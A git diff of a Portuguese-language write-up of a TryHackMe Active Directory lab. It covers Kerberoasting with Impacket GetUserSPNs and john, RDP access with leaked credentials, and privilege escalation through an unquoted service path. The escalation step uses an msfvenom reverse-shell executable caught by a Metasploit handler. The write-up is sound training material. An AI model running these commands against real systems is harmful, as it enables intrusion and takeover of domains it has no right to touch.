@@ -6,7 +6,6 @@
 **Data de Conclusão:** 06/10/2025  
 
 ---
-
 ## Resumo Executivo
 > Visão geral do impacto técnico e de negócio das vulnerabilidades encontradas.
 
@@ -91,19 +90,23 @@ Verificando todas as pastas, as duas únicas pastas que permite a exploração/l
 
 ---
 ## 2. Intrusão Inicial (Initial Access)
----
+
 
 Após não encontrar nada relevante para a intrusão nos diretórios encontrados no SMB, vamos realizar uma nova varredura em busca de mais portas abertas, e dessa vez, realizamos para todas as portas, afim de encontrar uma porta da qual não encontramos antes.
+
 <img width="834" height="468" alt="image" src="https://github.com/user-attachments/assets/181da457-7496-4e07-ad27-a2a332a4f659" />
 
 Essa nova varredura descobriu diversas novas portas mas que possivelmente estão sendo filtradas, mas, uma delas dispõe de um serviço IIS, dessa forma, foi analisado na web essa porta.
+
 <img width="1365" height="588" alt="image" src="https://github.com/user-attachments/assets/4513e690-a40d-44f2-a4b3-6a8b75691151" />
 
 Ao acessar a interface encontramos uma página que espera uma conexão com e-mail, que também dispõe de conexões com Google e Microsoft. Mas antes mesmo de tentar acessar com uma conta teste, há um aviso na tela informando a migração para o GitHub, algo estranho.
 Com isso em mente, foi pesquisado usando Google Dorks relação com o GitHub e o enterprise.thm. Logo no primeiro resultado foi encontrado um repositório relacionado à máquina do laboratório.
+
 <img width="1364" height="582" alt="image" src="https://github.com/user-attachments/assets/aeb487e5-7516-4dc8-8baf-e97269383a7b" />
 
 Explorando o GitHub, foi possível encontrar 1 pessoa ligada ao repositório do Enterprise. analisando essa pessoa, encontramos um arquivo .ps1. Ao verificar esse arquivo não foi encontrado nada, mas ao verificar o histórico de commits, foi descoberto credenciais de AD.
+
 <img width="1360" height="583" alt="image" src="https://github.com/user-attachments/assets/17b5b9d5-3327-4e71-85a9-012ee29a3da8" />
 
 ### Exploração da Vulnerabilidade
@@ -114,12 +117,15 @@ Agora por termos credenciais válidas de um usuário, podemos usá-la para encon
 ```bash
 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py lab.enterprise.thm/n[ENCONTRADO]:T[ENCONTRADO] -request
 ```
+
 <img width="834" height="268" alt="image" src="https://github.com/user-attachments/assets/f0f58d92-1071-4b43-bc10-5f45b94b66de" />
 
 Após conseguir a hash SPN, deve ser utilizado o john para a tentativa de quebra conseguindo uma nova credencial nesse domínio.
+
 ```bash
 john --format=krb5tgs spn --wordlist=/usr/share/wordlists/rockyou.txt
 ```
+
 <img width="796" height="180" alt="image" src="https://github.com/user-attachments/assets/58955f1b-b876-4565-bfe3-e819db62675f" />
 
 Com essas duas credenciais, é possível tentar abusar da porta RDP aberta no domínio. Primeiro com o usuário n[ENCONTRADO] falha, mas com o usuário b[ENCONTRADO] o acesso é realizado.
@@ -147,6 +153,7 @@ Assim, o arquivo user possui a primeira flag: THM{e[ENCONTRADO]}
 Identificação do vetor de elevação de privilégios:
 
 Para identificar vetores para elevação de privilégios, foi tranferido o arquivo WinPEAS.ps1 para a máquina e verificado os resultados encontrados. Foi identificado um serviço com o nome de ZeroTier One.exe, o mesmo estava com a flag de Unquoted Service Path, indicando que o serviço não possui aspas no seu caminho de execução.
+
 <img width="1365" height="627" alt="image" src="https://github.com/user-attachments/assets/c1c4ad61-57f4-4408-bc34-e3aa874175a8" />
 
 Como o mesmo está com a flag de Unquoted, significa que é possível criar um arquivo malicioso e inseri-lo antes da pasta que possui o executável original da aplicação(Tem permissão de escrita). Para isso utiliza-se o msfvenom para criar um arquivo .exe com reverse shell:
@@ -158,15 +165,18 @@ msfvenom -p windows/x64/shell/reverse_tcp -f exe LHOST=[MEU_IP] LPORT=1234 -o sh
 <img width="839" height="308" alt="image" src="https://github.com/user-attachments/assets/34a0965d-4b83-4998-a148-a7ab89ad179d" />
 
 Após a criação, realizamos a transferência para a máquina alvo(foi realizado copia e cola, pois no xfreerdp havia inserido a flag "/clipboard"), renomeamos para "Zero.exe" e colocamos na pasta encontrada no WinPEAS.
+
 <img width="837" height="287" alt="image" src="https://github.com/user-attachments/assets/a55c9159-31be-4cee-b2ec-d3e6262acd9a" />
 
 Após a cópia, como se trata de um serviço, é necessário apenas executar o início desse serviço. Mas antes, devemos executar o handler do Metasploit na máquina atacante, tendo em vista o payload malicioso ter sido feito com msfvenom.
+
 ```bash
 msf > use exploit/multi/handler #Usar handler para capturar a shell
 msf exploit(multi/handler) > set LHOST [IP_ATACANTE]
 msf exploit(multi/handler) > SET LPORT 1234
 msf exploit(multi/handler) > rerun
 ```
+
 <img width="844" height="483" alt="image" src="https://github.com/user-attachments/assets/a74a75a6-f0de-40ad-b8a6-8b2493e12784" />
 
 Agora com o handler aguardando a conexão, basta executar o serviço "zerotieroneservice" na máquina alvo.
